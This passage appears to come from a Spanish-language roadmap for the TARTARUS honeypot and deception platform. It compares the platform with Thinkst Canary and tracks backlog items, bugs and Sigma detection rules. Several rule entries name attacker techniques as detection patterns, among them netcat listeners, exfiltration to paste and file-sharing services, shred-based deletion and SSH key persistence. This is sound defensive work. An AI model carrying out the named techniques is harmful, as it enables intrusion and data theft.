> gate del Tier 0. Prioridad del usuario: **OT primero + despliegues internos para demo; nube al final.**

**Un sensor Canary integra, más allá de los cebos:** 22 servicios (incl. **Modbus/OT**, RDP, SMB,
LDAP, MSSQL, VNC, WinRM), ~50 personalities, **Portscan Monitor**, IP-stack fingerprint + MAC spoof,
unión a **AD** (se presenta como Domain Controller), file-share con árbol tokenizado (doble capa:
red + off-network). 5 modos (HW/VM/nube/Docker/Tailscale) con **token de registro** que auto-enrola.
Export a SOC por webhook/syslog/API.

**Matriz de gap TARTARUS vs Canary (verificada en código):**

| Capacidad | Canary | TARTARUS hoy | Gap |
|---|---|---|---|
| Modos despliegue | 5 + enroll token | Docker + RPi3/RPi5 = **2 de 5** | VM/OVA, nube, Tailscale, enroll token |
| Servicios señuelo | 22 (incl. Modbus) | SSH/HTTP/TCP/Telnet/MCP + FTP/SMB/MySQL/RDP/SNMP/NTP (OpenCanary, no en raíz) | **Modbus/OT**, LDAP, VNC, portscan |
| Personalities | ~50 | 6 | breadth + IP-fingerprint + MAC spoof |
| AD / DC | se une al AD | cosmético (banner) | miembro/DC real |
| Tokens | 32 | ~8 reales; 10 recetas del planter **inertes** | consolidar + ampliar |
| Export SOC | API+webhook+syslog | notify humanos + STIX pull | **webhook/syslog OUTBOUND** |
| Notificaciones | funciona | **rota** (todo off por defecto, sin persistir) | persistir + UI creds + visibilidad |
| Dashboard | alerts-centric (~7) | **27 secciones**, 3 mapas, `graph.js` huérfano | reducir a núcleo triage |

### E-A · Fabric de enrolamiento + sensor Docker (ARRANCAR AQUÍ)
- **TE-A1 Enroll token por flock (M):** `POST /flocks/{id}/enroll` (un solo uso, expira, ligado a flock).
- **TE-A2 Self-register + auto-bind (M):** `POST /sensors/enroll` crea el sensor **con** `flock_id`;
  consolida `sensor_registry` (HMAC) + `remote_sensors` (sin auth) en uno. Reusa `/ingest/sensor` (T0-2).
- **TE-A3 Re-home al borrar flock (S):** al eliminar un flock, sus sensores → Default, **nunca
  huérfanos** (lección POC Thinkst: borrar flock desemparejó el hardware). Cierra tokens per-flock.
- **TE-A4 Imagen/`docker run` con token (M):** el sensor Docker trae el enroll token (modelo Canary).

### E-B · Capacidades del sensor — OT primero
- **TE-B1 Modbus/502 señuelo (M):** listener propio o Conpot → `/ingest/sensor`. Primer entregable OT.
- **TE-B2 Portscan detection first-class (M):** módulo portscan OpenCanary y/o promover
  `flow_classifier.port_scan_score:83` a alerta. 100% pasivo (apto OT).
- **TE-B3 LDAP/VNC + OpenCanary en stack raíz (M):** ampliar superficie IT.
- **TE-B4 Realismo (L):** IP-stack fingerprint (cierra T6-4), más personalities, AD-como-DC.

### E-C · Consolidación de cebos (arreglar lo roto)
- **TE-C1 Planter que beacone (S):** `canary_planter.py:39,43` siembra placeholders que NO llaman a
  casa → reusar `canary_docgen`. **TE-C2 Creds del planter únicas + `register_decoy` (`:45-64`).**
- **TE-C3 Breadcrumbs reconciliados (S):** FTP/RDP/SMB no marcarse "no disponible" (`breadcrumb_engine.py:57`).
- **TE-C4 File-share cebo real (M):** filetree (T6-5) servido por SMB (OpenCanary) + docs tokenizados.

### E-D · Export a SOC-IA (Cortex XSIAM)
- **TE-D1 Webhook OUTBOUND (M):** canal genérico en `notifier.py` (POST alert-JSON al SOC) + syslog/CEF.

### E-E · Notificaciones (los 4 canales — hoy no funciona ninguno)
- **TE-E1 Persistencia (S):** `POST /notifications/config` solo muta RAM (`notify_router.py:82`) →
  persistir (DB/archivo) + recargar al boot.
- **TE-E2 UI de credenciales (S):** email/WhatsApp sin campos (`index.html:578,607`) → inputs SMTP/Twilio.
- **TE-E3 Observabilidad + test (S):** subir errores tragados (`notifier.py:135`) a `error`;
  `test/{ch}` acepta config en el body.

### E-F · Dashboard estricto (alerts-centric, modelo Thinkst)
- **TE-F1 Núcleo triage (M):** dejar en la vista principal solo tira de riesgo + **Live Events como
  lista de alertas héroe** (Ack + filtro) + Session Correlation + salud de sensores compacta + UN mapa.
- **TE-F2 Mover a navegación (M):** config/inventario/análisis (flocks, users, audit, notify, DRAS,
  detections, personalities, breadcrumbs, scanner, threat-intel, VRA, kill-chain, timeline) a
  pestañas/engrane.
- **TE-F3 Limpiar (S):** borrar `graph.js` (huérfano); 3 mapas → 1; quitar loaders redundantes.

### Modos de despliegue interno (tras E-A) + nube al final
- **TE-G1 VM/OVA (L)** · **TE-G2 Tailscale (M)** · **TE-G3 Nube AWS/Azure (L) — al final.**

**Enlaza con:** T6-1 (flocks), T6-4 (personalities/fingerprint), T6-5 (filetree), T6-8 (mass deploy),
T6-10 (auto-commission), Tier 4 (RPi 5), Tier 0 (`/ingest/sensor`).

---

## 7.6 TIER F — BRECHAS DE PRODUCTO Y VALIDACIÓN · P0–P2

> **Añadido 2026-08-07** tras probar la consola en vivo (feedback del usuario, 13 puntos). Varias son
> bugs reales; el **#1 (aislamiento entre flocks)** es P0 de seguridad. Diagnóstico verificado en
> código. Estimados: S≈1d · M≈2–3d · L≈1sem.

### A. Aislamiento entre flocks (seguridad, P0)
- **TF-1a Fuga cosmética de totales (S):** el backend SÍ aísla (`events_router.py:126,132`); el guard
  `_safeUpdate` (`main.js:18-27`) no repinta `0` → un flock vacío en 24h conserva el número global.
  Fix: limpiar `_lastKnown` de `totalEvents`/`activeAttackers`/riesgo en `_selectFlock`/`refreshFlockViews`,
  o dejar pasar `0` con flock activo, o keyear por flock; alinear ventana (flock=all-time).
- **TF-1b Vistas sin filtrar (S–M):** Kill Chain traces (`main.js:1844` sin `_flockParam`) y
  **Cross-Protocol Correlation** (`cross_correlator_router.py:89` **sin parámetro flock**, `timeline.js:697`
  tampoco, y falta en `refreshFlockViews`). Fix: añadir flock a ambas + meter loadCrossCorrelation al refresh.
- **TF-1c Clamp por usuario→flock (M) — aislamiento MSSP real:** `rbac.can_access_flock` existe pero
  **nadie lo llama**; con auth ON un usuario podría pedir `/events?flock_id=<otro>`. Fix: validar/clamp
  el `flock_id` de la query contra `allowed_flocks` del usuario en los endpoints de datos.
- **TF-12 Usuarios & Roles claro (S–M):** auth OFF por defecto → roles inertes; el flock por-usuario no
  scopea datos; muestra UUID crudo. Fix: nombre de flock, anotar "inerte con auth OFF", + TF-1c.

### B. Claridad de la consola (P1)
- **TF-4/6 Memo con Enter (S):** el memo del analista (`_initAlertUx`, `main.js:1721`) guarda solo al
  blur → Ctrl/Cmd+Enter→guardar. Un fix arregla Sessions + Threat Intel + tabla de eventos.
- **TF-2 Attack Map interactivo (M) ✅ hecho + rework:** click en atacante → **filtra el feed de Live
  Events por esa IP** (misma tabla, no una nueva); edges con `count` dibujado; leyenda. Rework por feedback:
  se descartó el panel/tabla aparte (redundante con Live Events). `window.filterFeedByIp(ip)`.
- **TF-3 Filtros data-driven (S–M) ✅ hecho + rework:** endpoint `/events/facets` → los menús de
  protocolo/IP/táctica muestran **solo lo detectado, con conteo** (nada de opciones vacías). El campo IP
  pasó de texto a **dropdown de IPs detectadas**. Riesgo (umbrales) + texto libre + rango + chips. El
  Attack Map alimenta el filtro de IP.
- **TF-5 Sensores claros (S):** bug de CSS — los dots active/degraded/unknown no se colorean
  (`tartarus.css:1742`); + subtítulo "sensores ≠ cebos"; renombrar `unknown`→"esperando heartbeat".
- **TF-8/11 Estados vacíos (S):** Attack Origin Map (LAN-only) mostrar "N internos ocultos"; Discovered
  Hosts poblar de IPs observadas (`events.source_ip`, `host_type='observed'`).
- **TF-10 Detección concisa (S–M):** 445 reglas saturan (tarjetas sin tope + catálogo completo en DOM).
  Fix: roll-up + top 5, detalle colapsado/lazy; el completo va al reporte.
- **TF-7 Copy de deception (S):** explicar en UI qué son Breadcrumbs (generar+plantar a mano) y
  Personalities (reescribir disfraz + reiniciar).

### C. Motor de IA del honeypot (P1)
- **TF-13a Seguridad de la llave (S–M):** la key de OpenAI está en claro en
  `beelzebub/configurations/services/telnet-23.yaml:15` pero **gitignoreada/NO en git** (subir el repo
  no la filtra); riesgo = artefacto de despliegue. Fix: rotar + secreto en reposo.
- **TF-13b Panel de prompts de persona (L) ✅ hecho (1c03f59):** `PUT /personalities/{id}` + `POST`
  (editar/crear catálogo, id validado anti-traversal) + editor UI (modal con textarea de prompt por
  protocolo LLM) + "Nueva persona". `scripts/enable_ssh_llm.py` da a `ssh-22` bloque plugin/LLM +
  catch-all (hereda la key de telnet en runtime, no destructivo) → aplicar persona SSH ya instala su
  prompt. **Auto-restart NO es posible desde el engine (C4)** → banner con el comando copiable. Modal AI
  Settings aclarada (LLM engine ≠ LLM honeypot). **Operativo:** el bloque LLM de ssh-22 queda en disco;
  se activa al `docker restart tartarus-beelzebub`. Cada comando SSH no reconocido → llamada al LLM (costo).

### C-bis. Análisis asistido por IA (futuro · API de IA)
- **TF-14 Session Correlation asistida por IA (L, futuro):** hoy Session Correlation agrupa por IP+ventana
  (correlación mecánica); el usuario la considera **insuficiente**. Cuando exista más señal (kill-chain
  multi-etapa, cebos cruzados endpoint→red, PhantomFS), sumar **análisis narrativo asistido por la API de
  IA**: resumir la sesión de un atacante, hipótesis de objetivo/TTPs, siguiente-paso probable, con citación
  a los eventos. Debe apoyarse en el LLM (local Ollama 5.2 o API) y marcarse como consumidor de la "API de
  IA" del engine. Marcado a petición del usuario (2026-08-07) como trabajo a planear, no inmediato.

### D. Validación E2E (P0 de confianza)
- **TF-9 Prueba de cebos + alertas (M, bloq. credenciales):** desplegar 1 token de cada tipo → guardar
  en `Pruebas de despliegue/` → gatillar → alerta a email + Telegram + **SMS** (añadir canal SMS al
  notifier, Twilio sin prefijo whatsapp:). Bucle hasta 100%.

**Orden Tier F:** (1) TF-1a/1b + TF-4/6 + TF-5 + TF-8/11 + TF-7 (quick-wins S) → (2) TF-9 validación →
(3) TF-1c + TF-12 + TF-13a (seguridad) → (4) TF-2 + TF-10 + TF-3 + TF-13b (features).

---

## 8. CROSS-CUTTING
- **Tests:** mantener la suite en verde; cada ítem añade sus tests. CI en cada merge.
- **Cadena de custodia VRA:** todo evento nuevo conserva SHA256 + timestamp + source_ip. Reportes de endpoint (PhantomFS) entran al Engagement Report con la misma normalización ("Simulated Threat Severity", "Entorno Controlado").
- **Anti-flickering UI:** toda sección nueva se cuelga del `_masterPoll()` único (10s) + `_safeUpdate()`, nunca un `setInterval` propio.
- **Cache Nginx:** assets nuevos con `no-cache, must-revalidate` + cache bust `?v=N`.

---

## 9. SECUENCIA RECOMENDADA
| Orden | Bloque | Ítems | Por qué |
| --- | --- | --- | --- |
| 1 | Detección P0 | Reglas #1–5 | Mayor gap MITRE, esfuerzo S, sin deps |
| 2 | PhantomFS core | 3.3 → 3.1 → 3.2 | Deception de endpoint; 3.3 prerequisito |
| 3 | Detección P1/P2 | #6–16 + OWASP A08 | 100% MITRE y OWASP |
| 4 | PhantomFS diferenciador | 3.4 → 3.5 → 3.6 | Cadena endpoint→red = gancho de venta |
| 5 | UX alertas + tokens | T6-6, T6-3 Lote A | Triage en segundos; alto impacto en demo |
| 6 | HASSH + catch-all + malware | 4.1, 4.2, 4.3 | Habilita reglas restantes y captura real |
| 7 | Personalities + anti-detección | T6-4 + 5.4 | Realismo (ítem CRÍTICO) |
| 8 | Laboratorio RPi 5 | 5.1 → 5.2 → 5.3 | Field-deployable |
| 9 | Multi-tenancy MSSP | T6-1 → T6-7 → T6-2 | Servicio comercializable |
| 10 | Interop + resto | 4.4–4.8, T6-5, T6-8, T6-9, T6-10 | Interop SOC + escala |
| 11 | Mercado | Tier 5 | Post-laboratorio |

**Quick win arranque (1–2 días):** 5 reglas Sigma P0 (2.2) + regla PhantomFS (3.2).
**Quick win comercial:** T6-6 (UX alertas) + T6-3 Lote A.

---

## 10. TABLA MAESTRA DE TRACKING
| ID | Ítem | Tier | Prioridad | Esfuerzo | Depende de | Estado |
| --- | --- | --- | --- | --- | --- | --- |
| T0-1 | Ingesta no ciega (#10 healthcheck+reconexión) | 0 | P0 | M | — | PENDIENTE — 🔴 GATE. `/health` (main.py:201) no checa frescura de ingesta. |
| T0-2 | Telemetría de campo real (transporte único) | 0 | P0 | M | — | PENDIENTE — 🔴 GATE. `/events/webhook` no existe (Pi da 404); config manda AMQP a broker inexistente. |
| T0-3 | Test integración aislamiento flocks | 0 | P0 | M | — | PENDIENTE — 🟠 GATE. 835 tests son unit/mock; aislamiento nunca probado vs Postgres real. |
| T0-4 | Skills tartarus-* al día + de-dup | 0 | P0 | M | — | PENDIENTE — 🟠 GATE. 16+16 skills, 0 conocen flock/ack/two-level. |
| T0-5 | Un cerebro canónico (memory→wiki) | 0 | P0 | S | — | PENDIENTE — 🟡 GATE. |
| T0-6 | Definición de "desplegable" (checklist) | 0 | P0 | S | T0-1,T0-2,T0-3 | PENDIENTE — 🟡 GATE. |
| T0-7 | Postmortem #10 + release v0.6.2 (wiki) | 0 | P0 | S | — | PENDIENTE — 🟡 GATE. |
| T0-8 | Conteo de detección honesto (aplicables) | 0 | P0 | S | — | PENDIENTE — 🟡 GATE. 424 cargadas / ~89 aplican. |
| T0-9 | Sin fricción git en la wiki | 0 | P0 | S | — | PENDIENTE — ⚪ GATE. |
| T0-10 | Firma de agentes con convención | 0 | P0 | S | — | PENDIENTE — ⚪ GATE. |
| T0-11 | Clean-slate reproducible (/admin/reset) | 0 | P0 | S | — | PENDIENTE — ⚪ GATE. |
| T1-1 | Discovery mega-rule | 1 | P0 | S | — | HECHO (2026-07-09) — nueva `tartarus/discovery_host_enum.yml` (T1082/16/49/69/33). T1057 ya cubierto por `discovery/T1057`. |
| T1-2 | Impact: Data Destruction | 1 | P0 | S | — | HECHO (2026-07-09) — nueva `tartarus/impact_data_destruction.yml` (T1485). |
| T1-3 | Impact: Service Stop | 1 | P0 | S | — | HECHO (2026-07-09) — YA existía `impact/T1489_service_stop.yml`; extendida con shutdown/reboot/poweroff/init + tag T1529 en vez de duplicar. |
| T1-4 | Persistence: SSH Keys | 1 | P0 | S | — | HECHO (2026-07-09) — nueva `tartarus/persistence_ssh_authorized_keys.yml` (T1098.004), único hueco 100% real. |
| T1-5 | Persistence: Create Account | 1 | P0 | S | — | HECHO (2026-07-09) — YA existía `persistence/T1136_create_account.yml` (product:honeypot). Sin cambios. |
| T1-6 | Evasion: Timestomping | 1 | P1 | S | — | HECHO (07-09) — `tartarus/evasion_timestomping.yml` (touch -t/-r/-d). |
| T1-7 | Evasion: File Deletion | 1 | P1 | S | — | HECHO (07-09) — `tartarus/evasion_file_deletion.yml` (unlink/srm/shred). |
| T1-8 | C2: Encrypted Channel | 1 | P1 | M | T3-1 HASSH | BLOQUEADO — requiere HASSH (T3-1); no escribible como regla de command. |
| T1-9 | C2: Non-Standard Port | 1 | P1 | S | — | HECHO (07-09) — `tartarus/c2_non_standard_port.yml` (nc -lvp, puertos raros). |
| T1-10 | C2: Proxy | 1 | P1 | S | — | HECHO (07-09) — `tartarus/proxy_connection_tunneling.yml` (proxychains/http_proxy/socks). |
| T1-11 | Execution: WMI | 1 | P2 | S | — | HECHO (07-09) — `tartarus/execution_wmi_process_create.yml`. |
| T1-12 | Exfil: Web Service | 1 | P2 | S | — | HECHO (07-09) — `tartarus/exfil_web_service.yml` (transfer.sh/pastebin/anonfiles). |
| T1-13 | Persistence: Boot/Logon | 1 | P2 | S | — | HECHO (07-09) — `tartarus/persistence_unix_shell_profile.yml`. Reescrito como T1546.004 (Linux .bashrc/rc.local); T1547 es Windows (ya forense). |
| T1-14 | OWASP A08: Deserialization | 1 | P2 | M | — | HECHO (07-09) — `tartarus/http_insecure_deserialization.yml` (rO0AB/ObjectInputStream/pickle vía http_path), tag T1190. |
| T1-15 | Discovery: Remote Systems | 1 | P2 | S | — | HECHO (07-09) — `tartarus/discovery_remote_system.yml` (arp/nmap -sn/ping sweep). |
| T1-16 | Evasion: Masquerading | 1 | P2 | S | — | HECHO (07-09) — `tartarus/evasion_masquerading.yml` (doble extensión, /tmp/systemd). |
| T2-1 | Forwarder EventLog→JSON | 2 | P0 | M | T2-3 | PENDIENTE |
| T2-2 | Sigma PhantomFS decoy access | 2 | P0 | S | T2-1 | PENDIENTE |
| T2-3 | Ingesta sensor + UI registro | 2 | P0 | M | — | PENDIENTE |
| T2-4 | Honey creds cruzados | 2 | P1 | M | T2-1, T2-2 | PENDIENTE |
| T2-5 | Decoy documents LLM | 2 | P1 | M | T4-2 | PENDIENTE |
| T2-6 | Canary token #15 ProjFS | 2 | P2 | S | T2-3 | PENDIENTE |
| T3-1 | HASSH fingerprinting | 3 | P1 | M | — | BLOQUEADO (07-09) — por FUENTE DE DATOS, no hardware. Beelzebub no emite algoritmos KEXINIT del cliente (solo el banner `Client`). Requiere forkear Beelzebub (Go) para volcar el KEXINIT + columna `hassh` en events. Bloquea T1-8. |
| T3-2 | Catch-all port listener | 3 | P1 | L | — | PENDIENTE |
| T3-3 | Malware collection + sandbox | 3 | P1 | L | — | PENDIENTE |
| T3-4 | DNS honeypot | 3 | P1 | M | — | PENDIENTE |
| T3-5 | STIX/TAXII export | 3 | P1 | M | — | HECHO (07-09) — `engine/stix_exporter.py` (STIX 2.1 a mano, sin dep) + `GET /export/stix` en export_router. `test_stix_exporter.py` (6). Falta botón UI de descarga. |
| T3-6 | GeoIP map Canvas | 3 | P2 | M | — | HECHO backend (07-09) — `GET /events/geo` (agrega top-200 + enrich_ip + cache 60s) `test_events_geo.py` (2) + `ui/src/js/geomap.js` (Canvas puro). PENDIENTE cablear en index.html + colgar de `_masterPoll` (necesita stack para E2E). |
| T3-7 | Suricata IDS | 3 | P2 | L | — | PENDIENTE |
| T3-8 | Session replay | 3 | P2 | M | — | PENDIENTE |
| T4-1 | Docker ARM64 | 4 | P1 | M | — | PENDIENTE |
| T4-2 | Ollama + Qwen2.5 local | 4 | P1 | M | T4-1 | PENDIENTE |
| T4-3 | Hardening de campo | 4 | P1 | M | T4-1 | PENDIENTE |
| T4-4 | Anti-detection hardening | 4 | CRÍTICO | M | — | PENDIENTE |
| T4-5 | Scripts de ataque demo | 4 | P2 | S | — | PENDIENTE |
| T5-1 | ICS/SCADA honeypots | 5 | P3 | L | — | PENDIENTE |
| T5-2 | Active Directory deception | 5 | P3 | L | — | PENDIENTE |
| T5-3 | Plugin system | 5 | P3 | XL | — | PENDIENTE |
| T5-4 | Community hub reglas | 5 | P3 | M | — | PENDIENTE |
| T5-5 | Web app emulation | 5 | P3 | L | — | PENDIENTE |
| T6-1 | Multi-tenancy / Flocks (MSSP) | 6 | P1 | XL | /auth roles | FASE 1 HECHA (07-15) — fundación retrocompatible: tabla `flocks` + seed Default + `events.flock_id` (NULL=Default) + `/flocks` CRUD (default_flock_id, delete protege Default + re-homea eventos) + filtro `?flock_id` en /events/stats (aísla) + selector header + sección gestión UI. Verificado E2E (Cliente-B=0/0 vs global 928/3). Commit 0058d9d (rama feature/tier1-detection-nohardware, PR #6). **FASE 2 RBAC HECHA (07-15)** — `rbac.py` (núcleo puro 3 roles global_admin/manager/watcher, fail-closed) + `session_auth.py` (users.flock_id, role+flock en JWT, current_user, /auth/me, gestión /auth/users solo-admin sin exponer hash, protege último admin) + enforcement en flocks_router (watcher read-only, list scoped) + UI Usuarios & Roles + badge identidad. main.py crea users table siempre. Verificado E2E (756 tests). **FASE 2 en PR #7** (feature/flocks-phase2-rbac→main). **FASE 3 sensor→flock HECHA (07-15)** — `flock_resolver.py` (resolver puro protocol/honeypot_id/source_ip+CIDR) + tabla `flock_assignments` + consumer estampa flock_id (15ª col, cache 30s) + endpoints assignments con RE-HOME de eventos + UI por card. Verificado E2E: protocol=TCP re-homeó 644 eventos, aislamiento real, unassign revierte. 776 tests. **FASE 5 HECHA (07-15)** — `?flock_id` en /events (feed), /graph/attack-map (todas las agregaciones) y /events/geo; el selector del header re-scopea TODAS las vistas. Verificado curl (ACME→solo TCP). 786 tests. Commits Fase 3+5 en rama `feature/flocks-phase3-sensor-flock` (2 commits sobre Fase 2/PR#7). **RAMAS: main=Fase1; PR#7=Fase2; rama=Fase3+5.** FASES PENDIENTES: (4) notificaciones por flock; flock_id en detections/canaries; empty-state "sin actividad reciente" cuando un flock tiene data vieja (UX); **sensor auto-bind a flock al desplegar** (hoy `flock_id` solo lo setea el operador con `POST /sensors/{id}/flock` → ver TE-2). |
| T6-2 | Subsistema de Breadcrumbs | 6 | P1 | L | honeypots red | HECHO (07-14) — `breadcrumb_engine.py` (6 generadores: ssh-key, putty .reg, winscp .ini, .rdp, smb-shortcut, http-bookmark) + `/breadcrumbs/*` (types con available=true SOLO si hay honeypot del servicio) + selector UI con modal copiar/descargar. Cada migaja embebe marcador único registrado via decoy_usage (sinergia: reuso→alerta). Verificado E2E. Commit c8277d4. |
| T6-3 | Expansión tokens 14→30 | 6 | P1 | L | tokens actuales | PARCIAL AVANZADO (07-14) — Lote A (browser-cookie/sensitive-cmd/mysql-dump/wireguard) + document tokens (docx/pdf/xlsx fire-on-open) + Lote web (webbug URL, image, redirect 302, cloned-site JS, cloned-css) vía `POST /canary-tokens/web` + UI "🔗 Web Token". Todo reusa el motor web-bug `GET /canary/t/{token}`. Faltan: QR (necesita lib), Google Doc/Sheet (necesita Google API), SAML/Azure/O365. |
| T6-4 | Personalities + IP-stack fingerprint | 6 | P1 | L | T4-4 | PARCIAL (07-14) — catálogo + apply HECHO: 6 personalities (FortiGate/Synology/Jenkins/Cisco/Ubuntu/Windows) en `beelzebub/configurations/personalities/*.yml` + `personality_engine.py` (merge preservando credenciales LLM + backup) + `/personalities/*` + selector UI con cards. Engine monta el dir de beelzebub (docker-compose.dev-mac). Verificado E2E (key de telnet-23 intacta). Commit 13e1195. FALTA: IP-stack fingerprint (nmap -O, necesita tuning de host/sysctl — hardware). |
| T6-5 | Generador árbol industry-specific | 6 | P1 | M | — | HECHO (07-09) — `POST /deception/generate-filetree?profile=` (deception_filetree.py + deception_router.py). LLM (OpenAI/DeepSeek) con fallback INDUSTRY_SEEDS (electronica/legal/salud/finanzas/manufactura/generico). Árbol creíble con docs tokenizados (reusa canary_docgen + mint_document_token + _RECIPES). GET download ZIP. Verificado: árbol electrónica con gerber/esquematico/proveedores tokenizados. Commit 6f584b7. |
| T6-6 | UX de alertas (memo, related, ignore) | 6 | P1 | M | — | HECHO backend (07-09) — `engine/alert_ux_router.py` (memo CRUD Redis, related-count PG, ignore-IP Redis set) montado en main.py + `test_alert_ux_router.py` (16). Falta panel UI (textarea memo, badge recurring, botón mute-IP) para E2E. |
| T6-7 | Consola enterprise (MFA/SSO/audit) | 6 | P2 | L | T6-1 | PARCIAL (07-14) — AUDIT TRAIL HECHO: `audit.py` (middleware que registra POST/PUT/DELETE de la consola con etiqueta legible, sin body/secretos, excluye GET y públicos) + tabla `console_audit` (schema.py) + `GET /audit` + vista UI (Time/Actor/Action/Source IP/Status). Commit e8fb50f. FALTAN: MFA/WebAuthn (difícil E2E headless) + SAML SSO (dep T6-1). |
| T6-8 | Token Factory + mass deploy + dominios | 6 | P2 | M | T6-1, T6-3 | PENDIENTE |
| T6-9 | Graphview 3 columnas | 6 | P3 | M | — | HECHO (07-09) — "Attack Map": `GET /graph/attack-map` (events_router, 11 tests) + Canvas puro `ui/js/attackmap.js`. Réplica del Graphview Thinkst: atacante→categoría-evento→Default Flock/sensores, badges de conteo, edges por severidad, hover resalta camino. Verificado E2E (screenshot). Commit 6a8d5ae. |
| T6-10 | Exclusiones heartbeat + auto-commission | 6 | P2 | S | T6-1 | PENDIENTE |

| TE-A1 | Enroll token por flock | E-A | P1 | M | T6-1 | **EN PROGRESO** — arranque Tier E. |
| TE-A2 | Self-register + auto-bind a flock | E-A | P1 | M | TE-A1 | EN PROGRESO — consolida sensor_registry+remote_sensors; reusa /ingest/sensor (T0-2). |
| TE-A3 | Re-home sensores al borrar flock | E-A | P1 | S | TE-A2 | PENDIENTE — lección POC Thinkst (no huérfanos). Cierra tokens per-flock. |
| TE-A4 | Imagen/docker run con enroll token | E-A | P1 | M | TE-A2 | PENDIENTE. |
| TE-B1 | Modbus/502 señuelo (OT) | E-B | P1 | M | TE-A2 | PENDIENTE — 1er entregable OT (cliente ~88u). |
| TE-B2 | Portscan detection first-class | E-B | P1 | M | — | PENDIENTE — promover flow_classifier.port_scan_score. |
| TE-B3 | LDAP/VNC + OpenCanary en stack raíz | E-B | P1 | M | — | PENDIENTE. |
| TE-B4 | Realismo (IP-fingerprint, +personalities, AD-DC) | E-B | P1 | L | T6-4 | PENDIENTE. |
| TE-C1 | Planter que beacone (reusar canary_docgen) | E-C | P1 | S | — | PENDIENTE — hoy siembra placeholders inertes. |
| TE-C2 | Creds del planter únicas + register_decoy | E-C | P1 | S | TE-C1 | PENDIENTE — hoy llaves de ejemplo inertes. |
| TE-C3 | Breadcrumbs reconciliados con OpenCanary | E-C | P1 | S | — | PENDIENTE — 3 falsos "no disponible". |
| TE-C4 | File-share cebo SMB + docs tokenizados | E-C | P1 | M | TE-B3 | PENDIENTE — doble capa Thinkst. |
| TE-D1 | Webhook/syslog OUTBOUND a SOC (XSIAM) | E-D | P1 | M | — | PENDIENTE. |
| TE-E1 | Notificaciones: persistencia de config | E-E | P1 | S | — | PENDIENTE — hoy solo RAM, todo off. |
| TE-E2 | Notificaciones: UI de credenciales (SMTP/Twilio) | E-E | P1 | S | — | PENDIENTE. |
| TE-E3 | Notificaciones: observabilidad + test-send | E-E | P1 | S | — | PENDIENTE. |
| TE-F1 | Dashboard: núcleo triage alerts-centric | E-F | P1 | M | — | PENDIENTE — hoy 27 secciones/3 mapas. |
| TE-F2 | Dashboard: mover config/análisis a navegación | E-F | P1 | M | TE-F1 | PENDIENTE. |
| TE-F3 | Dashboard: borrar graph.js + 3 mapas→1 + loaders | E-F | P1 | S | — | PENDIENTE. |
| TE-G1 | Modo VM/OVA (ESXi/Hyper-V) | E-G | P1 | L | TE-A4 | PENDIENTE. |
| TE-G2 | Modo Tailscale/overlay | E-G | P1 | M | TE-A4 | PENDIENTE. |
| TE-G3 | Modo nube (AWS/Azure) | E-G | P2 | L | TE-A4 | PENDIENTE — **al final** (decisión usuario). |

**Totales:** 64 ítems (47 + 11 Tier 0 + 6 Tier E) · Tier 0 es la PUERTA (11 × P0) antes de todo lo demás.
**Totales previos:** 47 ítems · 8 P0 · 16 P1 · 12 P2 · 6 P3 · 1 CRÍTICO.
**Corte por valor comercial (MSSP):** T6-1 + T6-6 + T6-2 + T6-3 + T6-7. Los dos primeros (UX alertas + tokens) se demuestran sin la multi-tenancy completa.

---

## 11. RESUMEN EJECUTIVO
Cerrando Tier 1 + Tier 2 (los 8 P0): 100% MITRE detectable, 100% OWASP y primera capacidad de deception de endpoint (PhantomFS), reutilizando sensores/Sigma/kill chain/notificaciones ya construidos. La cadena cruzada endpoint→red (T2-4) es el diferenciador. Tiers 3–5 escalan captura, despliegue de campo (RPi 5) y nichos. Tier 6 convierte Tartarus de plataforma técnica a servicio MSSP comercializable (multi-tenancy, breadcrumbs, tokens, UX de alertas, MFA/SSO), donde ya supera a Thinkst en analítica (LLM-native, MCP, Sigma/YARA inline, VRA, kill chain automático).

---

## CHANGELOG DE TRACKING
- 2026-08-07 — **Auditoría de proceso + exploración de despliegue de campo → 2 tiers nuevos:**
  - **Tier 0 (SANEAMIENTO / PUERTA)** insertado antes del Tier 1: 11 ítems (T0-1..T0-11) de un audit
    del *proceso de trabajo* (skills atrasadas, 0 tests de integración, dos cerebros, wiki sin
    postmortem/release, conteo de detección inflado) + 2 bloqueantes de despliegue (T0-1 ingesta ciega
    #10; T0-2 telemetría de campo rota). Puerta de calidad: **nada nuevo hasta `scripts/audit_gate.sh`
    = exit 0** (decisión del usuario: "todo el backlog"). El gate re-ejecutable es el "loop de evaluación".
  - **Tier E (DESPLIEGUE SELF-SERVICE DE CAMPO)** tras el Tier 6: TE-1..TE-6 (enrollment token por flock,
    self-register + auto-bind, transporte único, instalador cliente, health remoto, colocación de trampas).
    Ancla la "Fase E" del master plan, hoy 0% en código. Se construye tras cerrar el Tier 0.
  - **Hallazgo de despliegue (crítico):** el despliegue de campo NO reporta datos — `/events/webhook`
    no existe (los Pi dan 404) y la config copiada traza AMQP a `broker:5672` inexistente. El deploy
    físico de loaaan casi seguro no aterriza eventos hasta T0-2/TE-3.
  - **Colaboradores:** `dsantamaria0224` (asesor) invitado admin; `loaaan` sigue pendiente de aceptar.
- 2026-07-07 — Documento importado al repo (Claude Code). Estado real del código verificado por delante del baseline: 526 tests, 391 reglas Sigma, 30 YARA, main.py 295 líneas. Pendiente: auditar cobertura MITRE real vs las 16 reglas "faltantes" (varias podrían ya existir bajo `engine/rules/sigma/mitre/`).
- 2026-07-09 — **Auditoría MITRE real + hallazgo estructural (crítico para todo el Tier 1):**
  - `sigma_lite.evaluate()` **ignora `logsource`** — matchea SOLO por nombre de campo. Coexisten 3 clases de reglas en `engine/rules/sigma/`:
    - **`product: tartarus`** (~46, dir `tartarus/`) y **`product: honeypot`** (dirs de táctica `impact/`, `persistence/`, `discovery/`…) → usan campo `command` → **SÍ disparan** sobre eventos de Beelzebub.
    - **`product: windows|linux|macos`** (~297, dirs `mitre/`, `artifacts/`…, autor "Chronos-DFIR") → usan `Image`/`CommandLine`/`EventID` → **NO disparan** sobre honeypot (esos campos no existen en el evento). Son reglas forenses de Chronos que viven en el mismo repo. Dan *ilusión* de cobertura MITRE en el conteo (391) pero no cazan tráfico honeypot.
  - Implicación: el conteo "391 reglas" y la matriz MITRE del reporte están **infladas** para el caso honeypot. La cobertura honeypot real ≈ reglas con campo `command`.
  - **Reglas P0 (T1-1..T1-5) cerradas** con esta lente: 3 nuevas (`discovery_host_enum`, `impact_data_destruction`, `persistence_ssh_authorized_keys`) + 2 ya existían (T1489, T1136). Tests en `tests/test_p0_honeypot_rules.py` (12, verdes). Motor pasa de 391→394 reglas.
